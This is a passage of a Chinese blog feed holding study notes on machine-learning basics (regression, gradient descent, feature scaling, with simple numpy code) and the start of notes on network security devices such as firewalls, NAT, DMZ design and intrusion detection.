title="无监督学习"></a>无监督学习</h2><p>无监督学习是<strong>不知道</strong>数据具体的含义，比如给定一些数据但不知道它们具体的信息，对于分类问题无监督学习可以得到多个不同的<strong>聚类</strong>，从而实现预测的功能。</p><p>即</p><div class="language-txt"><button title="Copy code" class="copy"></button><span class="lang">txt</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #babed8">Find something interesting in unlabeled data.</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301734439.png"></p><p><strong>聚类</strong> Group similar data points together.</p><ul><li>例如google news对新闻的聚类, 实现相关文章&#x2F;新闻推荐</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301736818.png"></p><ul><li>例如DNA的分析</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301738533.png"></p><ul><li>例如用户集群的划分</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407301740853.png"></p><p><strong>其他类型</strong></p><ul><li><strong>异常检测</strong></li><li><strong>降维</strong></li></ul><h2 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h2><p>(线性)回归模型是一种特殊的监督学习模型</p><p>线性回归是拟合一条线，将训练数据尽可能分布到线上。</p><p>有多变量的线性回归称为多元线性回归。</p><p>下图为单变量线性回归模型</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407311629652.png"></p><h2 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h2><p>即cost function, 衡量模型预测的值与真实目标值的差异, 用来评估参数的好坏, 模型会尝试找到最优的参数, 使cost尽可能小</p><ul><li><p>例如, 用方差表示:</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407311717251.png"></p></li><li><p>视觉上为预测值与真实值的高度差<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407311753360.png"></p></li></ul><h2 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h2><p>一种尝试最小化代价函数的算法</p><ul><li><p>首先为每个参数赋一个初值, 根据代价函数的梯度, 一步一步调整参数, 得到最优解</p></li><li><p>初值的不同可能会导致得到的最优解不同, 图中可能会导致两个截然不同的最优解<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408011830505.png"></p></li></ul><p>梯度下降算法  a : 学习率, J: 代价函数</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202407312122596.png"></p><h2 id="学习率"><a href="#学习率" class="headerlink" title="学习率"></a>学习率</h2><p>alpha表示学习率, 即每次更新的步长</p><ul><li>若学习率太小, 则每次的步太短, 则需要很多步才能达到最低, 效率太低<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408011826014.png"></li><li>若学习率太大, 则最后可能不收敛, 甚至可能发散<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408011827170.png"></li></ul><h2 id="多维特征"><a href="#多维特征" class="headerlink" title="多维特征"></a>多维特征</h2><p>通常, 问题都会涉及到多个变量，例如房屋价格预测就包括，面积、房间个数、楼层、价格等</p><p>因此, 模型就要包含多个变量, </p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408012139319.png"></p><p>也可写成向量形式</p><p><img src="C:\Users\Myprefer\AppData\Roaming\Typora\typora-user-images\image-20240801215148717.png" alt="image-20240801215148717"></p><h2 id="矢量化"><a href="#矢量化" class="headerlink" title="矢量化"></a>矢量化</h2><p>使用python库<code>numpy</code>可以方便的进行矢量化操作, 可以使代码运行速度大大提高</p><p>例如</p><div class="language-python"><button title="Copy code" class="copy"></button><span class="lang">python</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #BABED8">w </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> np</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">array</span><span style="color: #89DDFF">([</span><span style="color: #F78C6C">1.0</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">2.5</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">-</span><span style="color: #F78C6C">3</span><span style="color: #89DDFF">])</span></span><span class="line"><span style="color: #BABED8">b </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #F78C6C">4</span></span><span class="line"><span style="color: #BABED8">x </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> np</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">array</span><span style="color: #89DDFF">([</span><span style="color: #F78C6C">10</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">20</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">30</span><span style="color: #89DDFF">])</span></span></code></pre></div><p>模型可简化为</p><div class="language-python"><button title="Copy code" class="copy"></button><span class="lang">python</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #BABED8">f </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> np</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">dot</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">w</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> x</span><span style="color: #89DDFF">)</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">+</span><span style="color: #BABED8"> b</span></span></code></pre></div><p>效果相当于</p><div class="language-python"><button title="Copy code" class="copy"></button><span class="lang">python</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #BABED8">f </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> w</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">]</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">*</span><span style="color: #BABED8"> x</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">]</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">+</span></span><span class="line"><span style="color: #BABED8">    w</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">]</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">*</span><span style="color: #BABED8"> x</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">]</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">+</span></span><span class="line"><span style="color: #BABED8">    w</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">2</span><span style="color: #89DDFF">]</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">*</span><span style="color: #BABED8"> x</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">2</span><span style="color: #89DDFF">]</span><span style="color: #BABED8"> </span><span style="color: #89DDFF">+</span><span style="color: #BABED8"> b</span></span></code></pre></div><p>相比与非矢量的方法, 矢量化可以并行计算, 提高效率</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408012200148.png"></p><h2 id="特征缩放"><a href="#特征缩放" class="headerlink" title="特征缩放"></a>特征缩放</h2><p>通常, 多个变量的大小的范围不同, 可以将所有的特征变量缩放到大致相同的范围, 这样可以通常减少梯度算法的迭代步数</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408021808812.png"></p><p>图中, 将数据范围分别为(0, 5)和(300, 2000)的数据缩放到了(0, 1)</p><p>特征缩放不一定非要落到[-1，1]之间，只要数据足够接近就可以。如[0, 3]和[-2. 0.5]等等</p><p>效果演示代码:</p><div class="language-python"><button title="Copy code" class="copy"></button><span class="lang">python</span><pre class="shiki material-theme-palenight" style="background-color: #1a1a1a" tabindex="0"><code><span class="line"><span style="color: #89DDFF; font-style: italic">import</span><span style="color: #BABED8"> numpy </span><span style="color: #89DDFF; font-style: italic">as</span><span style="color: #BABED8"> np</span></span><span class="line"><span style="color: #89DDFF; font-style: italic">import</span><span style="color: #BABED8"> matplotlib</span><span style="color: #89DDFF">.</span><span style="color: #F07178">pyplot</span><span style="color: #BABED8"> </span><span style="color: #89DDFF; font-style: italic">as</span><span style="color: #BABED8"> plt</span></span><span class="line"><span style="color: #89DDFF; font-style: italic">from</span><span style="color: #BABED8"> sklearn</span><span style="color: #89DDFF">.</span><span style="color: #BABED8">preprocessing </span><span style="color: #89DDFF; font-style: italic">import</span><span style="color: #BABED8"> MinMaxScaler</span><span style="color: #89DDFF">,</span><span style="color: #BABED8"> StandardScaler</span></span><span class="line"></span><span class="line"><span style="color: #BABED8">np</span><span style="color: #89DDFF">.</span><span style="color: #F07178">random</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">seed</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">x1 </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> np</span><span style="color: #89DDFF">.</span><span style="color: #F07178">random</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">normal</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">100</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">20</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">100</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">x2 </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> np</span><span style="color: #89DDFF">.</span><span style="color: #F07178">random</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">normal</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">50</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">10</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">100</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">x3 </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> np</span><span style="color: #89DDFF">.</span><span style="color: #F07178">random</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">normal</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">200</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">50</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">100</span><span style="color: #89DDFF">)</span></span><span class="line"></span><span class="line"><span style="color: #BABED8">data </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> np</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">column_stack</span><span style="color: #89DDFF">((</span><span style="color: #82AAFF">x1</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> x2</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> x3</span><span style="color: #89DDFF">))</span></span><span class="line"></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">figure</span><span style="color: #89DDFF">(</span><span style="color: #BABED8; font-style: italic">figsize</span><span style="color: #89DDFF">=(</span><span style="color: #F78C6C">12</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">6</span><span style="color: #89DDFF">))</span></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">subplot</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">2</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">scatter</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">data</span><span style="color: #89DDFF">[:,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">],</span><span style="color: #82AAFF"> data</span><span style="color: #89DDFF">[:,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">],</span><span style="color: #82AAFF"> </span><span style="color: #BABED8; font-style: italic">c</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">data</span><span style="color: #89DDFF">[:,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">2</span><span style="color: #89DDFF">],</span><span style="color: #82AAFF"> </span><span style="color: #BABED8; font-style: italic">cmap</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">viridis</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">title</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">Original Data</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">xlabel</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">Feature 1</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">ylabel</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">Feature 2</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">)</span></span><span class="line"></span><span class="line"><span style="color: #BABED8">scaler </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> </span><span style="color: #82AAFF">MinMaxScaler</span><span style="color: #89DDFF">()</span></span><span class="line"><span style="color: #BABED8">data_normalized </span><span style="color: #89DDFF">=</span><span style="color: #BABED8"> scaler</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">fit_transform</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">data</span><span style="color: #89DDFF">)</span></span><span class="line"></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">subplot</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">2</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">2</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">scatter</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">data_normalized</span><span style="color: #89DDFF">[:,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">],</span><span style="color: #82AAFF"> data_normalized</span><span style="color: #89DDFF">[:,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">],</span><span style="color: #82AAFF"> </span><span style="color: #BABED8; font-style: italic">c</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">data_normalized</span><span style="color: #89DDFF">[:,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">2</span><span style="color: #89DDFF">],</span><span style="color: #82AAFF"> </span><span style="color: #BABED8; font-style: italic">cmap</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">viridis</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">title</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">Normalized Data</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">xlabel</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">Feature 1</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">)</span></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">ylabel</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">&#39;</span><span style="color: #C3E88D">Feature 2</span><span style="color: #89DDFF">&#39;</span><span style="color: #89DDFF">)</span></span><span class="line"></span><span class="line"><span style="color: #BABED8">plt</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">show</span><span style="color: #89DDFF">()</span></span><span class="line"></span></code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;监督学习&quot;&gt;&lt;a href=&quot;#监督学习&quot; class=&quot;headerlink&quot; title=&quot;监督学习&quot;&gt;&lt;/a&gt;监督学习&lt;/h2&gt;&lt;p&gt;监督学习是已经知道数据的label&lt;/p&gt;
&lt;p&gt;即&lt;/p&gt;
&lt;div class=&quot;language-txt&quot;&gt;&lt;butt</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>网络安全设备相关知识</title>
    <link href="https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86.html"/>
    <id>https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86.html</id>
    <published>2024-06-13T07:40:52.000Z</published>
    <updated>2024-06-14T03:54:34.075Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络安全设备"><a href="#网络安全设备" class="headerlink" title="网络安全设备"></a>网络安全设备</h2><p><a href="https://myprefer.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86">网络安全设备相关知识 | Myprefer’s Blog</a></p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul><li><strong>控制</strong>: 对进出数据进行限制(包过滤, 如ACL)</li><li><strong>管理</strong>: 网络隔离, 进行安全防护(NAT)</li><li><strong>记录</strong>: 对进出数据进行检查, 记录相关信息</li></ul><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ul><li><p>在网络协议栈的各个层次上实施网络访问控制机制</p><ul><li>网络层: 包过滤</li><li>传输层: 电路级代理</li><li>应用层: 应用层代理&#x2F;网关</li></ul></li><li><p>控制网络域间传送的数据流</p><ul><li>检查网络流量</li><li>防止脆弱或不安全的协议和服务</li><li>防止内部网络信息外泄</li><li>对网络存取和访问进行监控和审计</li><li>强化网络安全策略, 集成网络安全防御机制</li></ul></li></ul><h4 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h4><ul><li>无法防范内部的安全威胁(防外不防内</li><li>不能防范病毒</li><li>不能防范针对开放服务安全漏洞的渗透攻击</li><li>不能防范针对网络客户端程序的渗透攻击</li><li>不能防范基于隐蔽通道的特洛伊木马或僵尸网络</li></ul><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ul><li>按形态: 硬件&#x2F;软件</li><li>按技术: 包过滤(透明模式, 连交换机)&#x2F;代理(可作路由 ,NAT, ACL)</li></ul><h4 id="实现技术"><a href="#实现技术" class="headerlink" title="实现技术"></a>实现技术</h4><h5 id="包过滤"><a href="#包过滤" class="headerlink" title="包过滤"></a>包过滤</h5><ul><li>实现机制: 依据数据包的级别<strong>标记</strong>来控制数据包 </li><li>优点:<ul><li>只分析数据包的IP, TCP&#x2F;UDP协议和端口, 速度快</li><li>易于配置</li><li>对用户透明, 不需要提供额外的密码等</li></ul></li><li>缺点:<ul><li>只在网络层, 不能识别应用层协议或维持连接状态</li><li>安全性薄弱, 不能防止IP欺骗</li><li>难正确制订规则</li><li>不能引入认证机制</li></ul></li></ul><h5 id="代理网关"><a href="#代理网关" class="headerlink" title="代理网关"></a>代理网关</h5><ul><li>每一个内外网络之间的连接都要通过防火墙的介入和转换加强了控制</li><li>不同层面的代理技术:<ul><li>应用层: 应用层代理(HTTP代理)</li><li>传输层: 电路级代理(Socks代理)</li><li>网络层: NAT代理(NAT网关, 拨号上网路由器)</li></ul></li></ul><h5 id="代理-proxy-技术"><a href="#代理-proxy-技术" class="headerlink" title="代理(proxy)技术"></a>代理(proxy)技术</h5><ul><li>运行客户端通过代理与网络服务进行非直接的连接</li><li>在代理服务器上可以进行服务控制和内容检查</li></ul><h6 id="应用层代理"><a href="#应用层代理" class="headerlink" title="应用层代理"></a>应用层代理</h6><ul><li>也称应用层网关, 代理服务器</li><li>代理HTTP, Email等应用层服务</li></ul><h6 id="电路级代理"><a href="#电路级代理" class="headerlink" title="电路级代理"></a>电路级代理</h6><ul><li>在传输层</li><li>同时位多种不同的应用服务提供支持</li></ul><h5 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h5><ul><li>将私有地址转化为合法地址</li><li>允许多个用户分享少量或单一的IP地址(源IP)</li><li>允许将网络服务映射到内部服务网络IP和端口(目的NAT)</li></ul><h5 id="状态检测"><a href="#状态检测" class="headerlink" title="状态检测"></a>状态检测</h5><ul><li>在数据链路层和网络层之间对数据包进行检测</li><li>创建状态表用于维护连接上下文</li><li>特点: 安全性高, 性能高, 适应性好, 对用户和应用程序透明</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141017052.png"></p><h4 id="部署方式"><a href="#部署方式" class="headerlink" title="部署方式"></a>部署方式</h4><h5 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a>路由模式</h5><ol><li>配置接口互联地址。（配置ip）</li><li>配置路由，使地址路由可达。</li><li>配置源NAT使内网服务器可以访问公网。</li><li>放行对应的防火墙策略。</li></ol><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141034988.png"></p><p>当防火墙位于内部网络和外部网络之间时，需要将防火墙与内部网络、外部网络以及DMZ 三个区域相连的接口分别配置成不同网段的IP 地址，重新规划原有的网络拓扑，此时相当于一台<strong>路由器</strong>。</p><h5 id="透明模式"><a href="#透明模式" class="headerlink" title="透明模式"></a>透明模式</h5><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141036802.png"></p><p>如果防火墙采用透明模式进行工作，则可以避免改变拓扑结构造成的麻烦，此时防火墙对于子网用户和路由器来说是完全透明的。也就是说，用户完全感觉不到防火墙的存在。</p><h5 id="混合模式"><a href="#混合模式" class="headerlink" title="混合模式"></a>混合模式</h5><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141037016.png"></p><p>如果防火墙既存在工作在路由模式的接口（接口具有IP 地址），又存在工作在透明模式的接口（接口无IP 地址），则防火墙工作在混合模式下。</p><h4 id="部署方法"><a href="#部署方法" class="headerlink" title="部署方法"></a>部署方法</h4><h5 id="包过滤路由器"><a href="#包过滤路由器" class="headerlink" title="包过滤路由器"></a>包过滤路由器</h5><p><img src="C:\Users\Myprefer\AppData\Roaming\Typora\typora-user-images\image-20240614104619194.png" alt="image-20240614104619194"></p><ul><li><strong>优势</strong>: 成本低, 易用</li><li><strong>缺点</strong>:<ul><li>一旦路由器被攻破, 内网完全暴露</li><li>内部网络信息对外公开, 可攻击开放的主机和服务</li></ul></li></ul><h5 id="双宿主堡垒主机"><a href="#双宿主堡垒主机" class="headerlink" title="双宿主堡垒主机"></a>双宿主堡垒主机</h5><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>堡垒主机(Bastion Host): 对外部网络暴露, 同时也是内部网络用户的主要连接点</p><p>双宿主主机(Dual-homed Host): 至少有两个网络接口的通用计算机系统</p></blockquote><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141049303.png"></p><ul><li>使用应用代理网关作为双宿主堡垒主机<ul><li>一个使用公网IP地址连接外部网络</li><li>一个使用私有IP地址连接内部网络</li><li>由应用代理服务器程序为特定的网络应用提供代理</li></ul></li><li>优点: 对外屏蔽内网信息, 用户身份认证和行为审计</li><li>缺点:<ul><li>内网对外访问控制过于严格</li><li>堡垒主机安全性差</li><li>一旦堡垒主机被攻破, 内网也将全面暴露</li></ul></li></ul><h5 id="屏蔽主机"><a href="#屏蔽主机" class="headerlink" title="屏蔽主机"></a>屏蔽主机</h5><h5 id="屏蔽子网"><a href="#屏蔽子网" class="headerlink" title="屏蔽子网"></a>屏蔽子网</h5><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>DMZ(Demilitarized Zone, 非军事区或停火区): 在内部网络和外部网络之间增加的一个子网</p></blockquote><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202406141113256.png"></p><ul><li>三层防护: 外网防火墙, 应用层代理, 内网防火墙</li></ul><h4 id="策略设置"><a href="#策略设置" class="headerlink" title="策略设置"></a>策略设置</h4><ul><li>没有明确允许的就是禁止<ul><li>先阻止所有数据包</li><li>放行允许的</li></ul></li></ul><h3 id="入侵检测系统-IDS"><a href="#入侵检测系统-IDS" class="headerlink" title="入侵检测系统(IDS)"></a>入侵检测系统(IDS)</h3><p>入侵检测系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取<strong>主动</strong>反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS是一种积极主动的安全防护技术。</p><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><ul><li>防火墙的重要补充</li><li>构建网络安全防御体系重要环节</li><li>克服传统防御机制的限制</li></ul><h4 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h4><ul><li>监测分析用户和系统的活动</li><li>核查系统配置和漏洞</li><li>日志管理, 识别异常活动</li><li>针对攻击行为作出反应</li></ul><h4 id="技术架构"><a href="#技术架构" class="headerlink" 